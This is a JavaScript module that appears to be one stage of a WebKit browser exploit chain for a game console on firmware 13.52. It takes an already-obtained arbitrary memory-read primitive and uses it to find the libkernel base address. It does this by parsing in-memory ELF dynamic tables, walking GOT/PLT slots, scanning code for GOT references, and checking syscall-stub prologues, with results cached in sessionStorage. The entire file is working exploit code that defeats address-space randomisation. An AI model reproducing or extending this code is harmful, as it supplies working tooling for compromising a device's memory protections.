/**
 * Resolve libSceLibKernelWeb on 13.52 — never brute-scan GOT (OOM).
 * Paths: cache → ELF DT_PLTGOT → PLT xrefs in mapped .text.
 */
import { int64 } from "./int64.js";
import { webkitRvaMax } from "./pivot_gadgets.js";

const ELF_MAGIC = 0x464c457f;
const PT_LOAD = 1;
const PT_DYNAMIC = 2;
const DT_NULL = 0;
const DT_PLTGOT = 3;
const DT_SYMTAB = 6;
const DT_STRTAB = 10;
const DT_STRSZ = 11;
const DT_JMPREL = 23;
const DT_PLTRELSZ = 2;

const SS_LK_BASE = "wk-libkernelBase";
const SS_IAT_RVA = "wk-imp-error-rva";

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function read2p(p, addr) {
    if (!addr) return null;
    try { return p.read2(addr); } catch (_) { return null; }
}

function parseAddrSync(raw) {
    if (!raw) return null;
    const s = String(raw).replace(/^0x/i, "").trim();
    if (!s) return null;
    const n = BigInt("0x" + s);
    return new int64(Number(n & 0xffffffffn), Number((n >> 32n) & 0xffffffffn));
}

function u64FromRead8(w) {
    if (!w) return null;
    return (BigInt(w.hi >>> 0) << 32n) | BigInt(w.low >>> 0);
}

function i32At(bytes, off) {
    return (bytes[off] | (bytes[off + 1] << 8)
        | (bytes[off + 2] << 16) | (bytes[off + 3] << 24)) >> 0;
}

function bytesFromRead8(w, out, at) {
    at = at || 0;
    let v = w.low >>> 0;
    for (let i = 0; i < 4; i++) {
        out[at + i] = v & 0xff;
        v >>>= 8;
    }
    v = w.hi >>> 0;
    for (let i = 4; i < 8; i++) {
        out[at + i] = v & 0xff;
        v >>>= 8;
    }
}

export function isGetpidStub(v) {
    if (!v) return false;
    return (v.low & 0x00ffffff) === 0xc0c748
        && (v.hi >>> 24) === 0x49
        && (((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) === 20;
}

export function isLibkernelPrologue(p, lk) {
    if (!lk) return false;
    const w0 = read4p(p, lk);
    const w1 = read4p(p, lk.add32(4));
    return w0 != null && w1 != null
        && (w0 & 0xff) === 0xb8
        && (w1 & 0xffff) === 0x050f;
}

function iatRvaAllowed(rva, off) {
    return rva >= 0x10000 && rva <= webkitRvaMax(off);
}

function loadSessionIatRva() {
    try {
        const n = parseInt(sessionStorage.getItem(SS_IAT_RVA), 16);
        return n > 0 ? n : null;
    } catch (_) {
        return null;
    }
}

export function saveLibkernelSession(lk, iatRva) {
    try {
        if (lk) sessionStorage.setItem(SS_LK_BASE, String(lk));
        if (iatRva != null) sessionStorage.setItem(SS_IAT_RVA, iatRva.toString(16));
    } catch (_) { }
}

function lkFromIatSlot(p, webkitBase, rva, off, read8) {
    const errorFn = read8(p, webkitBase.add32(rva));
    if (!errorFn || (errorFn.hi === 0 && errorFn.low < 0x100000)) return null;
    const lk = errorFn.sub32(off.k__error);
    if (!isLibkernelPrologue(p, lk)) return null;
    return { lk, iatRva: rva, errorFn };
}

/** Parse ELF64 PT_DYNAMIC for DT_PLTGOT (few reads). */
export function elfGotPltRva(p, webkitBase, off) {
    const cap = webkitRvaMax(off);
    if (read4p(p, webkitBase) !== ELF_MAGIC) return null;
    if (read2p(p, webkitBase.add32(0x12)) !== 0x3e) return null;
    const ePhoff = read4p(p, webkitBase.add32(0x20));
    const ePhnum = read2p(p, webkitBase.add32(0x38));
    const ePhentsize = read2p(p, webkitBase.add32(0x36));
    if (ePhoff == null || !ePhnum || !ePhentsize) return null;

    let dynVaddr = null;
    let dynMemsz = null;
    for (let i = 0; i < ePhnum; i++) {
        const ph = ePhoff + i * ePhentsize;
        const pType = read4p(p, webkitBase.add32(ph));
        if (pType === PT_DYNAMIC) {
            const w0 = read8p(p, webkitBase.add32(ph + 0x10));
            const w1 = read8p(p, webkitBase.add32(ph + 0x28));
            if (!w0 || !w1) return null;
            dynVaddr = u64FromRead8(w0);
            dynMemsz = u64FromRead8(w1);
            break;
        }
    }
    if (dynVaddr == null || !dynMemsz) return null;

    const dynRva = Number(dynVaddr & 0xffffffffn);
    if (!iatRvaAllowed(dynRva, off)) return null;

    let pltgot = null;
    const tags = Math.min(Number(dynMemsz / 16n), 256);
    for (let t = 0; t < tags; t++) {
        const tagOff = dynRva + t * 16;
        const tagW = read8p(p, webkitBase.add32(tagOff));
        const valW = read8p(p, webkitBase.add32(tagOff + 8));
        if (!tagW || !valW) break;
        const tag = Number(u64FromRead8(tagW) & 0xffffffffn);
        if (tag === DT_NULL) break;
        if (tag === DT_PLTGOT)
            pltgot = Number(u64FromRead8(valW) & 0xffffffffn);
    }
    if (pltgot == null || !iatRvaAllowed(pltgot, off)) return null;
    return pltgot;
}

/** Walk .got.plt slots from DT_PLTGOT (bounded reads). */
export function scanGotPltSlots(p, webkitBase, off, gotRva, opts) {
    opts = opts || {};
    const read8 = opts.read8 || ((pp, a) => read8p(pp, a));
    const maxSlots = opts.maxSlots || 384;
    const step = 8;
    for (let i = 0; i < maxSlots; i++) {
        const rva = gotRva + i * step;
        if (!iatRvaAllowed(rva, off)) break;
        const hit = lkFromIatSlot(p, webkitBase, rva, off, read8);
        if (hit) return Object.assign(hit, { source: "got-plt+" + i });
    }
    return null;
}

function queueGotRva(state, gotRva, cap, off) {
    if (!iatRvaAllowed(gotRva, off)) return;
    const key = gotRva.toString(16);
    if (state.gotSeen[key]) return;
    state.gotSeen[key] = 1;
    if (state.gotQueue.length < 512)
        state.gotQueue.push(gotRva);
}

function scanXrefsInWindow(state, baseRva, buf, cap, off) {
    for (let start = 0; start <= 8; start++) {
        if (buf[start] === 0xff && buf[start + 1] === 0x15) {
            const disp = i32At(buf, start + 2);
            queueGotRva(state, baseRva + start + 6 + disp, cap, off);
        }
        if (start <= 7 && buf[start] === 0x48 && buf[start + 1] === 0x8b
            && (buf[start + 2] === 0x3d || buf[start + 2] === 0x05)) {
            const disp = i32At(buf, start + 3);
            queueGotRva(state, baseRva + start + 7 + disp, cap, off);
        }
    }
}

/**
 * Chunked PLT-xref scan — reads .text only, then verifies GOT slots.
 * Replaces brute GOT sweep (was ~1.5M data reads → OOM).
 */
export function scanErrorIatChunk(p, webkitBase, off, state) {
    const cap = webkitRvaMax(off);
    if (!state) {
        state = {
            phase: "elf",
            cursor: 0x10000,
            maxRva: cap,
            step: 8,
            chunk: 128,
            gotQueue: [],
            gotSeen: {},
            gotIdx: 0,
            best: null,
            win16: new Uint8Array(16),
            done: false,
        };
    }

    if (state.phase === "elf") {
        const gotRva = elfGotPltRva(p, webkitBase, off);
        if (gotRva != null) {
            state.gotPlt = gotRva;
            state.phase = "gotplt";
            return { done: false, state, phase: "elf-hit", gotPlt: gotRva };
        }
        state.phase = "code";
        return { done: false, state, phase: "elf-miss" };
    }

    if (state.phase === "gotplt") {
        const hit = scanGotPltSlots(p, webkitBase, off, state.gotPlt, { maxSlots: 384 });
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            state.done = true;
            state.best = hit;
            return {
                done: true,
                lk: hit.lk,
                iatRva: hit.iatRva,
                source: "got-plt",
                state,
            };
        }
        state.phase = "code";
        return { done: false, state, phase: "gotplt-miss" };
    }

    if (state.phase === "code") {
        let steps = 0;
        while (state.cursor < state.maxRva && steps < state.chunk) {
            const w0 = read8p(p, webkitBase.add32(state.cursor));
            if (w0) {
                bytesFromRead8(w0, state.win16, 0);
                const w1 = read8p(p, webkitBase.add32(state.cursor + 8));
                if (w1) bytesFromRead8(w1, state.win16, 8);
                scanXrefsInWindow(state, state.cursor, state.win16, cap, off);
            }
            state.cursor += state.step;
            steps++;
        }
        if (state.cursor >= state.maxRva) {
            state.phase = "verify";
            state.gotIdx = 0;
        }
        return { done: false, state, phase: "code", cursor: state.cursor, queued: state.gotQueue.length };
    }

    if (state.phase === "verify") {
        let checks = 0;
        while (state.gotIdx < state.gotQueue.length && checks < 48) {
            const rva = state.gotQueue[state.gotIdx++];
            const hit = lkFromIatSlot(p, webkitBase, rva, off, read8p);
            if (hit && (!state.best || rva < state.best.iatRva))
                state.best = hit;
            checks++;
        }
        if (state.gotIdx >= state.gotQueue.length) {
            state.done = true;
            if (state.best) {
                saveLibkernelSession(state.best.lk, state.best.iatRva);
                return {
                    done: true,
                    lk: state.best.lk,
                    iatRva: state.best.iatRva,
                    source: "plt-xref",
                    state,
                };
            }
            return { done: true, state, lk: null };
        }
        return { done: false, state, phase: "verify", left: state.gotQueue.length - state.gotIdx };
    }

    state.done = true;
    return { done: true, state, lk: null };
}

/** One-shot resolve using ELF + bounded GOT (no full scan loop). */
export function resolveLibkernelFast(p, webkitBase, off, opts) {
    opts = opts || {};
    const read8 = opts.read8 || ((pp, a) => read8p(pp, a));
    const log = opts.log || (() => {});
    const gotRva = elfGotPltRva(p, webkitBase, off);
    if (gotRva != null) {
        log("LK-ELF", "DT_PLTGOT +0x" + gotRva.toString(16));
        const hit = scanGotPltSlots(p, webkitBase, off, gotRva, { read8, maxSlots: 384 });
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: hit.source };
        }
    }

    return { ok: false, error: "need chunked PLT xref scan" };
}

/**
 * Resolve libkernel base — never reads webkit above webkitRvaMax.
 */
export function resolveLibkernel(p, webkitBase, off, opts) {
    opts = opts || {};
    const read8 = opts.read8 || ((pp, a) => read8p(pp, a));
    const log = opts.log || (() => {});

    if (!off || off.k__error == null)
        return { ok: false, error: "missing k__error" };

    try {
        const rawLk = sessionStorage.getItem(SS_LK_BASE);
        if (rawLk) {
            const lk = parseAddrSync(rawLk);
            if (lk && isLibkernelPrologue(p, lk)) {
                log("LK-CACHE", "libkernel " + lk);
                return { ok: true, lk, source: "cache" };
            }
            log("LK-CACHE-BAD", "stale " + rawLk);
        }
    } catch (_) { }

    const savedIat = loadSessionIatRva();
    if (savedIat != null && iatRvaAllowed(savedIat, off)) {
        const hit = lkFromIatSlot(p, webkitBase, savedIat, off, read8);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            log("LK-IAT", "+0x" + hit.iatRva.toString(16) + " → " + hit.lk);
            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: "session-iat" };
        }
    }

    const tableIat = off.wk___imp___error;
    if (tableIat != null && iatRvaAllowed(tableIat, off)) {
        const hit = lkFromIatSlot(p, webkitBase, tableIat, off, read8);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            log("LK-IAT", "table +0x" + tableIat.toString(16) + " → " + hit.lk);
            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: "table" };
        }
    } else if (tableIat != null) {
        log("LK-BLOCK", "13.00 IAT +0x" + tableIat.toString(16) + " unmapped");
    }

    const fast = resolveLibkernelFast(p, webkitBase, off, { read8, log });
    if (fast.ok) return fast;

    return { ok: false, error: "tap Scan IAT (PLT xref — not brute GOT)" };
}
